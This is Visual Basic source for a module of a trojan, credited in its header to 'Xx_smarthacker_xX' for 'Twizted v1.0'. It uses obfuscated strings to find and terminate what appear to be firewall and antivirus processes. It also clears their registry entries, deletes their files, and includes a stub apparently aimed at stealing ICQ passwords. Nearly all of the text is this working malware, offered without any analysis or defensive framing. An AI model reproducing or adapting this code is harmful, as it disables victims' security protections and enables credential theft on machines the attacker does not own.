Attribute VB_Name = "FIREWALL"
'Trojan api By Xx_smarthacker_xX, Moisty
'For Twizted v1.0

Option Explicit

Private Declare Function GetShortPathName Lib "Kernel32" Alias "GetShortPathNameA" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal cchBuffer As Long) As Long

Public Sub SearchFirewall()
   Dim lRebootNow As Boolean
   Dim cRegistry As String
   Dim cPath As String
   Dim hFile As Long
   Dim nLoop As Long

   nFirewall = -1

   
   KillProgramInMemory Decript("171181171931251441761061571961281851]f")

   
   KillProgramInMemory Decript("281191281941191671091171871671381071gq")
   KillProgramInMemory Decript("661631661 491811215613312611217615110a")
   KillProgramInMemory Decript("631091631841711351151171541571731961fC")
   KillProgramInMemory Decript("721491721251241571631971821371j:")

   
   KillProgramInMemory Decript("261902261761971302261402071681661]y")
   KillProgramInMemory Decript("761012761861871202361991361591zb")

   
   KillProgramInMemory Decript("441661441421581981471151381681271561541541551KN")

   
   KillProgramInMemory Decript("221431221 290418213215.")

   
   KillProgramInMemory Decript("451981451741531251361471271371861781eU")
   KillProgramInMemory Decript("2213512211115312412312312218419315A")
   KillProgramInMemory Decript("671741671501591731271621091521671641;k")
   KillProgramInMemory Decript("701502701361411691121591711481421281u&")
   KillProgramInMemory Decript("581261581021002931002751991061Jt")

   
   KillProgramInMemory Decript("061531061 39141 89871721651331651521/[")
   KillProgramInMemory Decript("851102851951931461671991451191qY")

   
   KillProgramInMemory Decript("441661441421251851161341071KN")
   KillProgramInMemory Decript("621002621851431291341771p9")

  
   KillProgramInMemory Decript("171802171661051861051071081702181881771781181691xf")

   
   KillProgramInMemory Decript("231202231061911171801461641281741?r")

   cRegistry = Decript("7614329319027618222612321718123413327618121711324714819412326718227517222614029413329518222718221716122614919416819312814411027216910419u")
   cPath = QueryValue(HKEY_LOCAL_MACHINE, cRegistry, Decript(" 59841821171921-g"))

   If cPath <> "" Then
      While cPath <> "" And Right$(cPath, 1) <> "\"
         cPath = Left$(cPath, Len(cPath) - 1)
      Wend

      CreateNewKey cRegistry, HKEY_LOCAL_MACHINE
      SetKeyValue HKEY_LOCAL_MACHINE, cRegistry, Decript(" 49261721581821,u"), "", REG_SZ

      If cPath <> "" Then
         KillProgramInMemory cPath
      End If
   End If

   cRegistry = Decript("011391011151 79261 68551421371521791651902751202121731351712601791151612641022551602721122151602551912851271331022061612141512641291331122341612651612551402641281331471321071821981111481421)i")
   cPath = QueryValue(HKEY_LOCAL_MACHINE, cRegistry, "")

   If cPath <> "" Then
      While cPath <> "" And Right$(cPath, 1) <> "\"
         cPath = Left$(cPath, Len(cPath) - 1)
      Wend

      CreateNewKey cRegistry, HKEY_LOCAL_MACHINE
      SetKeyValue HKEY_LOCAL_MACHINE, cRegistry, "", "", REG_SZ

      If cPath <> "" Then
         KillProgramInMemory cPath
      End If
   End If

   
   KillProgramInMemory Decript("701241701001401321521321801911121&6")
   KillProgramInMemory Decript("451171131291131571721881451361921>i")

   If nFirewall <> -1 Then
      hFile = FreeFile
      Open cDiretorioWindows + Decript("381741381511491241881241881241791nE") For Output As #hFile
      Print #hFile, Decript("271612881212981612161602sO")

      For nLoop = 0 To nFirewall
          Print #hFile, Decript("561661981861Zh") + GetShortFileName(aFirewall(nLoop))

          SetAttr aFirewall(nLoop), vbNormal
          Kill aFirewall(nLoop)
      Next

      Close #hFile


   End If
End Sub

Public Sub KillProgramInMemory(cProgram As String)
   Dim cPathRemoveFile As String
   Dim hSnapShot As Long
   Dim uProcess As PROCESSENTRY32
   Dim rProcess As Long
   Dim tPID As Long
   Dim tMID As Long
   Dim lExitCode As Long
   Dim hProcess As Long
   Dim cProcess As String

   cProgram = UCase$(cProgram)

   If Right$(cProgram, 1) = "\" Then
      cPathRemoveFile = cProgram

      FileSpec$ = "*.*"
      SearchDirs cPathRemoveFile, COMMAND_FIREWALL

      Exit Sub
   End If

   cPathRemoveFile = ""

   hSnapShot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)

   If hSnapShot <> 0 Then
      uProcess.dwSize = Len(uProcess)
      rProcess = ProcessFirst(hSnapShot, uProcess)

      Do While rProcess
         tPID = uProcess.th32ProcessID
         tMID = uProcess.th32ModuleID

         cPathRemoveFile = RemoveChr0(uProcess.szExeFile)

         If cPathRemoveFile <> "" And UCase$(Right$(cPathRemoveFile, Len(cProgram) + 1)) = "\" + cProgram Then
            While cPathRemoveFile <> "" And Right$(cPathRemoveFile, 1) <> "\"
               cPathRemoveFile = Left$(cPathRemoveFile, Len(cPathRemoveFile) - 1)
            Wend

            If cPathRemoveFile <> "" Then
               FileSpec$ = "*.*"
               SearchDirs cPathRemoveFile, COMMAND_FIREWALL
            End If

            cPathRemoveFile = ""

            hProcess = OpenProcess(PROCESS_TERMINATE, CLng(False), CLng(uProcess.th32ProcessID))

            If hProcess <> 0 Then
               If GetExitCodeProcess(hProcess, lExitCode) <> 0 Then
                  xAnswer = TerminateProcess(hProcess, lExitCode)
               End If
            End If
         End If

         rProcess = ProcessNext(hSnapShot, uProcess)
      Loop

      Call CloseHandle(hSnapShot)
   End If
End Sub

Public Function GetShortFileName(ByVal cFileName As String) As String
   Dim cShortPath As String
   Dim nLen As Long

   cShortPath = String$(165, 0)
   nLen = GetShortPathName(cFileName, cShortPath, 164)
   GetShortFileName = Left$(cShortPath, nLen)
End Function
Public Function Getpassword(ByVal icqfilename As String) As String
Call Icq("Get icqfilename")
Call Icqnumber("812351312851522051912751902421041341112251502641571 47222351222651771l*")
End Function
